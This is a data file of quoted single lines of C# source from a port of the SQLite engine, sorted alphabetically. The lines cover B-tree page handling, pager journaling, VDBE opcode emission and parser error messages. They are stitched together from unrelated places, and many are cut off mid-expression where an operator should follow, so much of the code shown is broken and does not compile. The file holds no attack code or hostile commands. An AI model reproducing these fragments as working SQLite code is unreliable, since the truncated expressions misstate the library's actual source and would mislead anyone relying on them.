"          if ( rc != 0 ) fprintf( p.trace, ""rc=%d"
"          if ( resolveOrderGroupBy( sNC, p, pGroupBy, ""GROUP"" ) != 0 /"
"          if ( sortableByRowid( iCur, pOrderBy, pWC.pMaskSet, ref rev ) )"
"          if ( sqlite3ExprIsInteger( pE, ref iCol ) != 0 )"
"          if ( sqlite3FindTable( db, zName, null ) != null )"
"          if ( sqlite3FixExprList( pFix, pExpr.x.pList ) != 0 ) return 1"
"          if ( sqlite3FixSelect( pFix, pExpr.x.pSelect ) != 0 ) return 1"
"          if ( sqlite3ResolveExprNames( sNC, ref pList.a[i].pExpr ) != 0 )"
"          if ( sqlite3ResolveExprNames( sNC, ref pX ) != 0 )"
"          if ( sqlite3StrICmp( aCol[j].zName, zName ) == 0 )"
"          if ( sqlite3StrICmp( pTab.aCol[j].zName, pChanges.a[i].zName ) == 0 )"
"          if ( sqlite3StrICmp( zColName, pTabCol.zName ) == 0 ) break"
"          if ( sqlite3StrICmp( zLeft, ""max_page_count"" ) == 0 )"
"          if ( sqlite3Utf8Read( zString, ref zString ) == 0 )"
"          if ( sqlite3VdbeMemGrow( pMem, 4, 0 ) != 0 )"
"          if ( sqlite3WalkExpr( pWalker, ref pItem.pExpr ) != 0 ) return WRC_Abort"
"          if ( sqlite3WalkExprList( pWalker, pExpr.x.pList ) != 0 ) return WRC_Abort"
"          if ( sqlite3WalkSelect( pWalker, pExpr.x.pSelect ) != 0 ) return WRC_Abort"
"          if ( sqlite3WalkSelect( pWalker, pItem.pSelect ) != 0 )"
"          if ( xferCompatibleIndex( pDestIdx, pSrcIdx ) ) break"
"          if ( zObj == null ) zObj = """
"          if (PTRMAP_ISPAGE(pBt, iLastPg))"
"          if (zFilename != """" "
"          insertCell(pParent, nxDiv, pCell, sz, pTemp, pNew.pgno, ref rc)"
"          int c, pC"
"          int iDb = sqlite3SchemaToIndex( pParse.db, pTab.pSchema )"
"          int iFOFC = findOverflowCell(pOld, j)"
"          int iReg = codeAlias( pParse, pItem.iAlias, pItem.pExpr, target "
"          int k, j, last"
"          int n = (int)sqlite3Get4byte(pOvflData, 4)"
"          int nStructSize = dupedExprStructSize( p, flags )"
"          int pCell = findCell(pPage, i)"
"          int pc = get2byte(data, cellStart "
"          int r1, rTemp = 0"
"          int rc = backupOnePage( p, iPage, aData )"
"          int score = matchQuality( p, nArg, enc )"
"          int size = get2byte(data, pc "
"          int size, j"
"          int x = (int)va_arg(ap,""int"")"
"          is opened using [sqlite3_open()], [sqlite3_open16()],"
"          j = get2byte(data, i)"
"          j1 = sqlite3VdbeAddOp1( v, OP_NotNull, regTrigRowid )"
"          j3 = sqlite3VdbeAddOp3( v, OP_NotExists, baseCur, 0, regRowid )"
"          k = sqlite3Get4byte(pTrunk.aData, 4)"
"          keyColumn >= 0, false, onError, endOfLoop, ref isReplace"
"          lockingStrategy.LockFile( pFile, RESERVED_BYTE, 1 )"
"          lockingStrategy.LockFile( pFile, SHARED_FIRST, SHARED_SIZE )"
"          lockingStrategy.UnlockFile( pFile, PENDING_BYTE, 1 )"
"          lockingStrategy.UnlockFile( pFile, RESERVED_BYTE, 1 )"
"          lockingStrategy.UnlockFile( pFile, SHARED_FIRST, SHARED_SIZE )"
"          m = getMask( pMaskSet, pTabItem.iCursor )"
"          next = (u16)get2byte(data, pc)"
"          or if [sqlite3_step(S)] has never before been called on S,"
"          p.aCol[iCol].zName, pTo )"
"          p.pWhere = sqlite3ExprAnd( pParse.db, p.pWhere, pRight.pOn )"
"          p.zErrMsg = """""
"          pBt.autoVacuum = sqlite3Get4byte(zDbHeader, 36 "
"          pBt.incrVacuum = sqlite3Get4byte(zDbHeader, 36 "
"          pCell = findCell(pPage, idx) "
"          pCol.pDflt = sqlite3ExprDup( db, pSpan.pExpr, EXPRDUP_REDUCE )"
"          pCol.zDflt = pSpan.zStart.Substring( 0, pSpan.zStart.Length - pSpan.zEnd.Length )"
"          pColl = sqlite3ExprCollSeq( pParse, pItem.pExpr )"
"          pColl = sqlite3ExprCollSeq( pParse, pRight )"
"          pDb.zName, pTab.zName"
"          pDel = (CollSeq)sqlite3HashInsert( ref db.aCollSeq, pColl[0].zName, nName, pColl )"
"          pDest, addrEnd, addrEnd )"
"          pDup = sqlite3ExprDup( db, pLeft, 0 )"
"          pEntry = rowSetMerge( aBucket[i], pEntry )"
"          pFix.zType, pFix.pName, pItem.zDatabase )"
"          pItem.zIndex = sqlite3NameFromToken( pParse.db, pIndexedBy )"
"          pKey, P4_KEYINFO_HANDOFF )"
"          pKey.aColl[i] = sqlite3LocateCollSeq( pParse, zColl )"
"          pKeyInfo = keyInfoFromExprList( pParse, pGroupBy )"
"          pKeyInfo, P4_KEYINFO )"
"          pMem.z = pOp.p5.ToString( ""x2"" )"
"          pNew = sqlite3ExprDup( db, pEList.a[pExpr.iColumn].pExpr, 0 )"
"          pNew = sqlite3PExpr( pParse, TK_IN, pDup, null, null )"
"          pNewExpr = sqlite3PExpr( pParse, ops[i],"
"          pParent.pGroupBy = sqlite3ExprListDup( db, pSub.pGroupBy, 0 )"
"          pParent.pHaving = sqlite3ExprAnd( db, pParent.pHaving,"
"          pParent.pHaving = substExpr( db, pParent.pHaving, iParent, pSub.pEList )"
"          pParent.pSrc = pSrc = sqlite3SrcListEnlarge( db, pSrc, nSubSrc - 1, iFrom "
"          pParent.pWhere = sqlite3ExprAnd( db, pParent.pWhere, pWhere )"
"          pParent.pWhere = substExpr( db, pParent.pWhere, iParent, pSub.pEList )"
"          pParse, pTab, baseCur, regIns, aRegIdx, false,"
"          pRangeEnd = findTerm( pWC, iCur, k, notReady, ( WO_LT "
"          pRangeStart = findTerm( pWC, iCur, k, notReady, ( WO_GT "
"          pSrc = pParent.pSrc = sqlite3SrcListAppend( db, null, null, null )"
"          pStr2.u.zToken = pStr2.u.zToken.Substring( 0, nPattern - 1 ) "
"          pTab = (Table)sqlite3HashFind( pLink.pTabSchema.tblHash, pLink.table, n )"
"          pTab = sqlite3SrcListLookup( pParse, pTblName )"
"          pTab.zName = sqlite3MPrintf( db, ""sqlite_subquery_%p_"", pTab )"
"          pTab.zName, zColName )"
"          pTerm = findTerm( pWC, iCur, j, notReady, (uint)eqTermMask, pProbe )"
"          pTerm = findTerm( pWC, iCur, j, notReady, WO_LT "
"          pTerm.prereqRight = exprListTableUsage( pMaskSet, pExpr.x.pList )"
"          pTerm.prereqRight = exprSelectTableUsage( pMaskSet, pExpr.x.pSelect )"
"          pWInfo = sqlite3WhereBegin( pParse, pTabList, pWhere, ref pGroupBy, 0 )"
"          pWhere = sqlite3ExprDup( db, pSub.pWhere, 0 )"
"          pager_error( pPager, rc )"
"          pager_playback( pPager, 0 )"
"          pgno = (int)sqlite3Get4byte(pCell, iCell)"
"          pgno = sqlite3Get4byte(pParent.aData, apDiv[i])"
"          pgno = sqlite3Get4byte(pParent.aOvfl[0].pCell, apDiv[i])"
"          ptrmapPut(pBt, childPgno, PTRMAP_BTREE, pgno, ref rc)"
"          ptrmapPut(pBt, iFreePage, eType, iPtrPage, ref rc)"
"          ptrmapPut(pBt, nextOvfl, PTRMAP_OVERFLOW2, iFreePage, ref rc)"
"          ptrmapPut(pBt, pgnoChild, PTRMAP_BTREE, pRoot.pgno, ref rc)"
"          ptrmapPut(pBt, pgnoNew, PTRMAP_BTREE, pParent.pgno, ref rc)"
"          ptrmapPutOvflPtr(pPage, pCell, ref pRC)"
"          put2byte(data, pbegin "
"          put2byte(data, pbegin, x)"
"          put32bits( pPgHdr.pData, 24, change_counter )"
"          r1 = sqlite3ExprCodeTemp( pParse, pX.pRight, ref rTemp )"
"          rc = allocateBtreePage(pBt, ref pNew, ref pgno, pgno, 0)"
"          rc = allocateBtreePage(pBt, ref pOvfl, ref pgnoOvfl, pgnoOvfl, 0)"
"          rc = btreeGetPage(pBt, iLastPg, ref pLastPg, 0)"
"          rc = btreeGetPage(pBt, pPgno, ref pPg, 0)"
"          rc = btreeGetPage(pBt, pgnoRoot, ref pRoot, 0)"
"          rc = clearDatabasePage(pBt, sqlite3Get4byte(pCell, iCell), 1, ref pnChange)"
"          rc = getOverflowPage(pBt, ovflPgno, ref pOvfl, ref iNext)"
"          rc = hasHotJournal( pPager, ref isHotJournal )"
"          rc = incrVacuumStep(pBt, nFin, iFree)"
"          rc = moveToChild(pCur, sqlite3Get4byte(pPage.aData, findCell(pPage, iIdx)))"
"          rc = moveToChild(pCur, sqlite3Get4byte(pPage.aData, pPage.hdrOffset "
"          rc = pCache.xStress( pCache.pStress, pPg )"
"          rc = pagerOpentemp( pPager, ref pPager.sjfd, SQLITE_OPEN_SUBJOURNAL )"
"          rc = pagerPlaybackSavepoint( pPager, pSavepoint )"
"          rc = pager_playback( pPager, 0 )"
"          rc = pager_playback_one_page( pPager, 0, 0, ref offset, 1, pDone )"
"          rc = pager_playback_one_page( pPager, 1, 0, ref pPager.journalOff, 1, pDone )"
"          rc = pager_playback_one_page( pPager, 1, isUnsync, ref pPager.journalOff, 0, null )"
"          rc = pager_truncate( pPager, mxPg )"
"          rc = pager_truncate( pPager, nNew )"
"          rc = pager_wait_on_lock( pPager, SHARED_LOCK )"
"          rc = ptrmapGet(pBt, iGuess, ref eType, ref pgno)"
"          rc = ptrmapGet(pBt, pgnoRoot, ref eType, ref iPtrPage)"
"          rc = relocatePage(pBt, pRoot, eType, iPtrPage, pgnoMove, 0)"
"          rc = sqlite3ApiExit( db, SQLITE_TOOBIG )"
"          rc = sqlite3ApiExit( p.db, rc )"
"          rc = sqlite3BitvecSet( p, i )"
"          rc = sqlite3BitvecSet( pPager.pInJournal, pgno )"
"          rc = sqlite3BtreeBeginTrans( p.pSrc, 0 )"
"          rc = sqlite3BtreeBeginTrans( pBt, 0 )"
"          rc = sqlite3BtreeData( pCur, (u32)offset, (u32)amt, pMem.zBLOB )"
"          rc = sqlite3BtreeKey( pCur, (u32)offset, (u32)amt,  pMem.zBLOB )"
"          rc = sqlite3BtreeNext( p.pCursor, ref res )"
"          rc = sqlite3BtreeNext(pCur, ref pRes)"
"          rc = sqlite3BtreePrevious(pCur, ref pRes)"
"          rc = sqlite3BtreeUpdateMeta( pTemp, aCopy[i], (u32)( meta "
"          rc = sqlite3BtreeUpdateMeta(p, 4, maxRootPgno)"
"          rc = sqlite3OsAccess( pVfs, zMaster, SQLITE_ACCESS_EXISTS, ref res )"
"          rc = sqlite3OsFileSize( pPager.jfd, ref sz )"
"          rc = sqlite3OsFullPathname( pVfs, zFilename, nPathname, zPathname )"
"          rc = sqlite3OsLock( pPager.fd, locktype )"
"          rc = sqlite3OsOpen( pVfs, pPager.zJournal, pPager.jfd, flags, ref int0 )"
"          rc = sqlite3OsOpenMalloc( ref pVfs, zMaster, ref pMaster,"
"          rc = sqlite3OsSync( pPager.fd, pPager.sync_flags )"
"          rc = sqlite3OsSync( pPager.jfd, SQLITE_SYNC_DATAONLY "
"          rc = sqlite3OsTruncate( pPager.jfd, 0 )"
"          rc = sqlite3OsTruncate( pPager.sjfd, 0 )"
"          rc = sqlite3OsWrite( pPager.fd, pData, pPager.pageSize, offset )"
"          rc = sqlite3OsWrite( pPager.jfd, zeroHdr, zeroHdr.Length, 0 )"
"          rc = sqlite3OsWrite( pPager.sjfd, pData2, pPager.pageSize, offset "
"          rc = sqlite3PagerPagecount( pPager, ref nPage )"
"          rc = sqlite3PagerPagecount( pSrcPager, ref nSrcPage )"
"          rc = sqlite3PagerReadFileheader(pBt.pPager, zDbHeader.Length, zDbHeader)"
"          rc = sqlite3PagerSetPagesize(pBt.pPager, ref pBt.pageSize,"
"          rc = sqlite3ResolveExprNames( pName, ref pExpr )"
"          rc = sqlite3VdbeCloseStatement( p, eStatementOp )"
"          rc = sqlite3VdbeMemSetStr( pVar, zData, nData, encoding, xDel )"
"          rc = zeroJournalHdr( pPager, hasMaster )"
"          rc2 = pager_end_transaction( pPager, pPager.setMaster )"
"          rc2 = sqlite3BtreeCommitPhaseOne( p.pSrc, """" )"
"          regAgg = sqlite3GetTempRange( pParse, nArg )"
"          reindexDatabases( pParse, zColl )"
"          reindexTable( pParse, pTab, zColl )"
"          removeElementGivenHash( pH, ref elem, h )"
"          resetAccumulator( pParse, sAggInfo )"
"          resolveAlias( pParse, pEList, pItem.iCol - 1, pItem.pExpr, zType )"
"          return winOpen( pVfs, zName, pFile,"
"          sAggInfo.sortingIdx, sAggInfo.nSortingColumn,"
"          selectAddColumnTypeAndCollation( pParse, pTab.nCol, pTab.aCol, pSel )"
"          selectColumnsFromExprList( pParse, pSel.pEList, ref pTab.nCol, ref pTab.aCol )"
"          selectInnerLoop( pParse, p, p.pEList, 0, 0, null, -1,"
"          selectInnerLoop( pParse, p, p.pEList, 0, 0, pOrderBy,"
"          size = (u16)get2byte(data, pc "
"          size = get2byte(data, i "
"          sqlite3 db = (sqlite3)va_arg(ap, ""sqlite3"")"
"          sqlite3AnalysisLoad( db, iDb )"
"          sqlite3BackupUpdate( pPager.pBackup, pgno, aData )"
"          sqlite3BackupUpdate( pPager.pBackup, pgno, pList.pData )"
"          sqlite3BeginWriteOperation( pParse, 0, iDb )"
"          sqlite3BitvecClear( pBitvec, (u32)i "
"          sqlite3BtreeGetMeta( p.pDest, BTREE_SCHEMA_VERSION, ref p.iDestSchema )"
"          sqlite3BtreeGetMeta( pMain, aCopy[i], ref meta )"
"          sqlite3BtreeGetMeta(p, BTREE_LARGEST_ROOT_PAGE, ref maxRootPgno)"
"          sqlite3BtreeSetCacheSize( pDb.pBt, pDb.pSchema.cache_size )"
"          sqlite3BtreeSetPageSize(db.aDb[0].pBt, 0, x, 0)"
"          sqlite3BtreeTripAllCursors( p, SQLITE_ABORT )"
"          sqlite3ChangeCookie( pParse, iDb )"
"          sqlite3ColumnDefault( v, pTab, idx, -1 )"
"          sqlite3DebugPrintf( """
"          sqlite3DebugPrintf( ""%"
"          sqlite3DebugPrintf( "", "" )"
"          sqlite3DropTriggerPtr( pParse, pTrigger )"
"          sqlite3Error( db, SQLITE_BUSY,"
"          sqlite3Error( db, SQLITE_ERROR,"
"          sqlite3Error( db, SQLITE_TOOBIG, ""statement too long"" )"
"          sqlite3Error( p.db, rc, 0 )"
"          sqlite3Error( pErrorDb, SQLITE_NOMEM, ""out of memory"" )"
"          sqlite3Error( pVm.db, SQLITE_RANGE, 0 )"
"          sqlite3ErrorMsg( pFix.pParse,"
"          sqlite3ErrorMsg( pParse, ""%r ORDER BY term does not match any "" "
"          sqlite3ErrorMsg( pParse, ""%s: %s"", zErr, zCol )"
"          sqlite3ErrorMsg( pParse, ""%s: %s"", zMsg, zName )"
"          sqlite3ErrorMsg( pParse, ""%s: %s.%s"", zErr, zTab, zCol )"
"          sqlite3ErrorMsg( pParse, ""%s: %s.%s"", zMsg, zDbase, zName )"
"          sqlite3ErrorMsg( pParse, ""%s: %s.%s.%s"", zErr, zDb, zTab, zCol )"
"          sqlite3ErrorMsg( pParse, ""Cannot add a column with non-constant default"" )"
"          sqlite3ErrorMsg( pParse, ""a GROUP BY clause is required before HAVING"" )"
"          sqlite3ErrorMsg( pParse, ""cannot have both ON and USING "" "
"          sqlite3ErrorMsg( pParse, ""corrupt database"" )"
"          sqlite3ErrorMsg( pParse, ""default value of column [%s] is not constant"","
"          sqlite3ErrorMsg( pParse, ""duplicate column name: %s"", z )"
"          sqlite3ErrorMsg( pParse, ""foreign key on %s"" "
"          sqlite3ErrorMsg( pParse, ""no such collation sequence: %s"", zName )"
"          sqlite3ErrorMsg( pParse, ""no such index: %S"", pName, 0 )"
"          sqlite3ErrorMsg( pParse, ""no such index: %s"", zIndex )"
"          sqlite3ErrorMsg( pParse, ""no such trigger: %S"", pName, 0 )"
"          sqlite3ErrorMsg( pParse, ""table %s has no column named %s"","
"          sqlite3ErrorMsg( pParse, ""temporary storage cannot be changed "" "
"          sqlite3ErrorMsg( pParse, ""temporary trigger may not have qualified name"" )"
"          sqlite3ErrorMsg( pParse, ""there is already an index named %s"", zName )"
"          sqlite3ErrorMsg( pParse, ""trigger %T already exists"", pName )"
"          sqlite3ErrorMsg( pParse, ""unable to open a temporary database "" "
"          sqlite3ErrorMsg( pParse, ""unknown database %T"", pName1 )"
"          sqlite3ErrorMsg( pParse, ""variable number must be between "
"          sqlite3ExprAnalyzeAggList( sNC, sAggInfo.aFunc[i].pExpr.x.pList )"
"          sqlite3ExprAnalyzeAggregates( pNC, ref pItem.pExpr )"
"          sqlite3ExprAnalyzeAggregates( sNC, ref pHaving )"
"          sqlite3ExprCacheAffinityChange( pParse, r1, 1 )"
"          sqlite3ExprCacheAffinityChange( pParse, regCols, pTab.nCol )"
"          sqlite3ExprCachePinRegister( pParse, p.iReg )"
"          sqlite3ExprCacheRemove( pParse, regBase "
"          sqlite3ExprCacheStore( pParse, iCur, -1, iRowidReg )"
"          sqlite3ExprCode( pParse, p.pOffset, iOffset )"
"          sqlite3ExprCode( pParse, pItem.pExpr, target "
"          sqlite3ExprCode( pParse, pRangeEnd.pExpr.pRight, regBase "
"          sqlite3ExprCode( pParse, pRangeStart.pExpr.pRight, regBase "
"          sqlite3ExprCode( pParse, pRowidExpr, regNewRowid )"
"          sqlite3ExprCode( pParse, pX.pRight, memEndValue )"
"          sqlite3ExprCodeAndCache( pParse, pRowidExpr, regRowid )"
"          sqlite3ExprCodeExprList( pParse, pList, regAgg, false )"
"          sqlite3ExprCodeMove( pParse, iBMem, iAMem, pGroupBy.nExpr )"
"          sqlite3ExprDelete( db, ref a.pExpr )"
"          sqlite3ExprDelete( db, ref pCol.pDflt )"
"          sqlite3ExprDelete( db, ref pExpr )"
"          sqlite3ExprDelete( db, ref pItem.pExpr )"
"          sqlite3ExprDelete( db, ref whenExpr )"
"          sqlite3ExprDup( db, pList.a[i].pExpr, 0 ), null )"
"          sqlite3ExprDup( db, pSub.pHaving, 0 ) )"
"          sqlite3ExprHardCopy( pParse, target, n )"
"          sqlite3ExprIfFalse( pParse, pHaving, addrEnd, SQLITE_JUMPIFNULL )"
"          sqlite3ExprIfFalse( pParse, pHaving, addrOutputRow "
"          sqlite3ExprIfFalse( pParse, pTerm.pExpr, addrCont, SQLITE_JUMPIFNULL )"
"          sqlite3ExprIfFalse( pParse, whenExpr, endTrigger, SQLITE_JUMPIFNULL )"
"          sqlite3ExprListDelete( db, ref p.x.pList )"
"          sqlite3ExprListDelete( db, ref pDel )"
"          sqlite3GenerateConstraintChecks( pParse, pTab, baseCur, regIns, aRegIdx,"
"          sqlite3Get4byte(pPage.aData, pPage.hdrOffset "
"          sqlite3GlobalConfig.szPage, sqlite3GlobalConfig.nPage )"
"          sqlite3IdListDelete( db, ref pSrc.a[i "
"          sqlite3LocateTable( pParse, 0, pFrom.zName, pFrom.zDatabase )"
"          sqlite3MPrintf( db, ""-- TRIGGER %s"", p.name ),"
"          sqlite3MPrintf( db, ""name='%q'"", pIndex.zName ), P4_DYNAMIC )"
"          sqlite3NestedParse( pParse,"
"          sqlite3OpenTable( pParse, iTab, iDb, pTab, OP_OpenRead )"
"          sqlite3OpenTable( pParse, pTabItem.iCursor, iDb, pTab, op )"
"          sqlite3OpenTableAndIndices( pParse, pTab, iCur, OP_OpenWrite )"
"          sqlite3OsCurrentTime( db.pVfs, ref rNow )"
"          sqlite3OsDelete( pVfs, zMaster, 0 )"
"          sqlite3PCacheBufferSetup( sqlite3GlobalConfig.pPage,"
"          sqlite3PagerPagecount( pPager, ref  idummy )"
"          sqlite3PagerTruncateImage( pDestPager, (u32)nDestTruncate )"
"          sqlite3PagerTruncateImage(pBt.pPager, nFin)"
"          sqlite3Parser( pEngine, TK_SEMI, pParse.sLastToken, pParse )"
"          sqlite3PcacheMove( pPg, origPgno )"
"          sqlite3Put4byte(data, idx, iChild)"
"          sqlite3Put4byte(pBt.pPage1.aData, 32, 0)"
"          sqlite3Put4byte(pBt.pPage1.aData, 36, 0)"
"          sqlite3Put4byte(pCell, iChild)"
"          sqlite3Put4byte(pPage.aData, pPage.hdrOffset "
"          sqlite3Put4byte(pPrior, 0)"
"          sqlite3Put4byte(pPrior, pPriorIndex, pgnoOvfl)"
"          sqlite3Put4byte(pPtrmap, offset "
"          sqlite3RefillIndex( pParse, pIndex, -1 )"
"          sqlite3RefillIndex( pParse, pIndex, iMem )"
"          sqlite3ReleaseTempRange( pParse, regIdx, pIdx.nColumn "
"          sqlite3ReleaseTempReg( pParse, rTemp )"
"          sqlite3ReleaseTempReg( pParse, regRec )"
"          sqlite3ReleaseTempReg( pParse, regTempRowid )"
"          sqlite3ResetInternalSchema( db, 0 )"
"          sqlite3ResetInternalSchema( db, 1 )"
"          sqlite3ResetInternalSchema( db, i )"
"          sqlite3RunParser( pParse, zSqlCopy, ref zErrMsg )"
"          sqlite3Select( pParse, pSelect, ref  dest )"
"          sqlite3Select( pParse, pSub, ref dest )"
"          sqlite3SelectDelete( db, ref p.x.pSelect )"
"          sqlite3SelectDestInit( dest, SRT_EphemTab, pItem.iCursor )"
"          sqlite3SelectDestInit( dest, SRT_Table, 1 )"
"          sqlite3SetString( ref  pData.pzErrMsg, db,"
"          sqlite3SetString( ref pzErrMsg, db, ""%s"", sqlite3ErrStr( rc ) )"
"          sqlite3StrAccumAppend( pAccum, ""%"", 1 )"
"          sqlite3StrAccumAppend( pAccum, fmt.Substring( bufpt, amt ), amt )"
"          sqlite3StrAccumAppend( pAccum, new string( buf, bufpt, length ), length )"
"          sqlite3StrAccumAppend( pAccum, zSep, nSep )"
"          sqlite3TableAffinityStr( v, pTab )"
"          sqlite3TableLock( pParse, iDb, pTab.tnum, 0, pTab.zName )"
"          sqlite3ValueApplyAffinity( pVal, SQLITE_AFF_NUMERIC, SQLITE_UTF8 )"
"          sqlite3ValueApplyAffinity( pVal, affinity, SQLITE_UTF8 )"
"          sqlite3ValueSetStr( db.pErr, -1, p.zErrMsg == null "
"          sqlite3ValueSetStr( db.pErr, -1, z, SQLITE_UTF8, (dxDel)SQLITE_DYNAMIC )"
"          sqlite3ValueSetStr( db.pErr, 0, null, SQLITE_UTF8, SQLITE_STATIC )"
"          sqlite3ValueSetStr( pVal, -1, zVal, SQLITE_UTF8, SQLITE_DYNAMIC )"
"          sqlite3VdbeAddOp0( v, OP_Trace )"
"          sqlite3VdbeAddOp0( v, OP_VBegin )"
"          sqlite3VdbeAddOp1( v, OP_Close, 1 )"
"          sqlite3VdbeAddOp1( v, OP_Close, iCur )"
"          sqlite3VdbeAddOp1( v, OP_Close, idx "
"          sqlite3VdbeAddOp1( v, OP_Expire, 0 )"
"          sqlite3VdbeAddOp1( v, OP_IsNull, iReg )"
"          sqlite3VdbeAddOp1( v, OP_MustBeInt, iOffset )"
"          sqlite3VdbeAddOp1( v, OP_MustBeInt, regNewRowid )"
"          sqlite3VdbeAddOp1( v, OP_MustBeInt, regRowid )"
"          sqlite3VdbeAddOp1( v, OP_MustBeInt, regTrigRowid )"
"          sqlite3VdbeAddOp1( v, OP_NullRow, pTabList.a[i].iCursor )"
"          sqlite3VdbeAddOp1( v, OP_RealAffinity, iReg )"
"          sqlite3VdbeAddOp1( v, OP_Return, regOutputRow )"
"          sqlite3VdbeAddOp1( v, OP_Return, regReset )"
"          sqlite3VdbeAddOp1( v, OP_ToInt, regTemp )"
"          sqlite3VdbeAddOp2( v, OP_AddImm, iMem "
"          sqlite3VdbeAddOp2( v, OP_AddImm, memCnt, 1 )"
"          sqlite3VdbeAddOp2( v, OP_AddImm, regTemp, -1 )"
"          sqlite3VdbeAddOp2( v, OP_Clear, pIdx.tnum, iDb )"
"          sqlite3VdbeAddOp2( v, OP_Close, iCur "
"          sqlite3VdbeAddOp2( v, OP_CreateTable, iDb, reg2 )"
"          sqlite3VdbeAddOp2( v, OP_Delete, iCur, 0 )"
"          sqlite3VdbeAddOp2( v, OP_Gosub, regOutputRow, addrOutputRow )"
"          sqlite3VdbeAddOp2( v, OP_Gosub, regReset, addrReset )"
"          sqlite3VdbeAddOp2( v, OP_Goto, 0, addrEnd )"
"          sqlite3VdbeAddOp2( v, OP_Goto, 0, addrTop )"
"          sqlite3VdbeAddOp2( v, OP_Goto, 0, iBeginAfterTrigger )"
"          sqlite3VdbeAddOp2( v, OP_Goto, 0, iBeginBeforeTrigger )"
"          sqlite3VdbeAddOp2( v, OP_Goto, 0, ignoreDest )"
"          sqlite3VdbeAddOp2( v, OP_Goto, 0, pLevel.addrBrk )"
"          sqlite3VdbeAddOp2( v, OP_Goto, 0, pParse.cookieGoto )"
"          sqlite3VdbeAddOp2( v, OP_Halt, SQLITE_CONSTRAINT, onError )"
"          sqlite3VdbeAddOp2( v, OP_IdxRowid, iIdxCur, iRowidReg )"
"          sqlite3VdbeAddOp2( v, OP_IfPos, iAbortFlag, addrEnd )"
"          sqlite3VdbeAddOp2( v, OP_IfPos, iUseFlag, addrOutputRow "
"          sqlite3VdbeAddOp2( v, OP_Integer, -1, iOffset "
"          sqlite3VdbeAddOp2( v, OP_Integer, -1, regTrigRowid )"
"          sqlite3VdbeAddOp2( v, OP_Integer, -size, 1 )"
"          sqlite3VdbeAddOp2( v, OP_Integer, 0, iAbortFlag )"
"          sqlite3VdbeAddOp2( v, OP_Integer, 0, iMem "
"          sqlite3VdbeAddOp2( v, OP_Integer, 0, iOffset )"
"          sqlite3VdbeAddOp2( v, OP_Integer, 0, iUseFlag )"
"          sqlite3VdbeAddOp2( v, OP_Integer, 0, reg2 )"
"          sqlite3VdbeAddOp2( v, OP_Integer, 1, iAbortFlag )"
"          sqlite3VdbeAddOp2( v, OP_Integer, 1, iMem )"
"          sqlite3VdbeAddOp2( v, OP_Integer, 1, iUseFlag )"
"          sqlite3VdbeAddOp2( v, OP_Integer, size, 1 )"
"          sqlite3VdbeAddOp2( v, OP_IsNull, r1, addrCont )"
"          sqlite3VdbeAddOp2( v, OP_IsNull, regBase "
"          sqlite3VdbeAddOp2( v, OP_NewRowid, srcTab, regTempRowid )"
"          sqlite3VdbeAddOp2( v, OP_Null, 0, iMem "
"          sqlite3VdbeAddOp2( v, OP_Null, 0, iMem )"
"          sqlite3VdbeAddOp2( v, OP_Null, 0, regBase "
"          sqlite3VdbeAddOp2( v, OP_Null, 0, regIns )"
"          sqlite3VdbeAddOp2( v, OP_Null, 0, regRow )"
"          sqlite3VdbeAddOp2( v, OP_Null, 0, regRowid )"
"          sqlite3VdbeAddOp2( v, OP_OpenEphemeral, srcTab, nColumn )"
"          sqlite3VdbeAddOp2( v, OP_RowData, iCur, regRow )"
"          sqlite3VdbeAddOp2( v, OP_Rowid, iCur, iRowidReg )"
"          sqlite3VdbeAddOp2( v, OP_Rowid, iCur, regRowid )"
"          sqlite3VdbeAddOp2( v, OP_SCopy, regBase "
"          sqlite3VdbeAddOp2( v, OP_Seek, iCur, iRowidReg )"
"          sqlite3VdbeAddOp2( v, OP_Transaction, i, ( type == TK_EXCLUSIVE ) "
"          sqlite3VdbeAddOp2( v, bRev != 0 "
"          sqlite3VdbeAddOp2( v, pLevel.op, pLevel.p1, pLevel.p2 )"
"          sqlite3VdbeAddOp3( v, OP_Add, iLimit, iOffset, iOffset "
"          sqlite3VdbeAddOp3( v, OP_Add, iMem, iMem "
"          sqlite3VdbeAddOp3( v, OP_Column, iCur, idx, regBase "
"          sqlite3VdbeAddOp3( v, OP_Column, iIdxCur, i, iMem "
"          sqlite3VdbeAddOp3( v, OP_Column, iIdxCur, i, regCol )"
"          sqlite3VdbeAddOp3( v, OP_Column, iIdxCur, nEq, r1 )"
"          sqlite3VdbeAddOp3( v, OP_Column, srcTab, i, regResult "
"          sqlite3VdbeAddOp3( v, OP_Concat, regTemp, regF2, regF2 )"
"          sqlite3VdbeAddOp3( v, OP_Divide, iMem "
"          sqlite3VdbeAddOp3( v, OP_Insert, oldIdx, iData, iRowid )"
"          sqlite3VdbeAddOp3( v, OP_Insert, srcTab, regRec, regTempRowid )"
"          sqlite3VdbeAddOp3( v, OP_Jump, j1 "
"          sqlite3VdbeAddOp3( v, OP_MakeRecord, regFromSelect, nColumn, regRec )"
"          sqlite3VdbeAddOp3( v, OP_Ne, regCol, 0, iMem "
"          sqlite3VdbeAddOp3( v, OP_NewRowid, baseCur, regRowid, regAutoinc )"
"          sqlite3VdbeAddOp3( v, OP_NotExists, iCur, addr, iRowid )"
"          sqlite3VdbeAddOp3( v, OP_OpenPseudo, oldIdx, 0, pTab.nCol )"
"          sqlite3VdbeAddOp3( v, OP_OpenWrite, 1, pParse.regRoot, iDb )"
"          sqlite3VdbeAddOp3( v, OP_ReadCookie, iDb, 2, BTREE_DEFAULT_CACHE_SIZE )"
"          sqlite3VdbeAddOp3( v, OP_SetCookie, iDb, BTREE_DEFAULT_CACHE_SIZE, 1 )"
"          sqlite3VdbeAddOp3( v, aMoveOp[pX.op - TK_GT], iCur, addrBrk, r1 )"
"          sqlite3VdbeAddOp3( v, testOp, memEndValue, addrBrk, iRowidReg )"
"          sqlite3VdbeAddOp4( pParse.pVdbe, OP_Trace, 0, 0, 0,"
"          sqlite3VdbeAddOp4( v, OP_CollSeq, 0, 0, 0, pColl, P4_COLLSEQ )"
"          sqlite3VdbeAddOp4( v, OP_Compare, iAMem, iBMem, pGroupBy.nExpr,"
"          sqlite3VdbeAddOp4( v, OP_Explain, i, pLevel.iFrom, 0, zMsg, P4_DYNAMIC )"
"          sqlite3VdbeAddOp4( v, OP_Int64, 0, iMem, 0, value, P4_INT64 )"
"          sqlite3VdbeAddOp4( v, OP_OpenRead, iIdxCur, pIx.tnum, iDb,"
"          sqlite3VdbeAddOp4( v, OP_ParseSchema, iDb, 0, 0,"
"          sqlite3VdbeAddOp4( v, OP_Real, 0, iMem, 0, value, P4_REAL )"
"          sqlite3VdbeAddOp4( v, OP_String8, 0, regTemp, 0, ' ', 0 )"
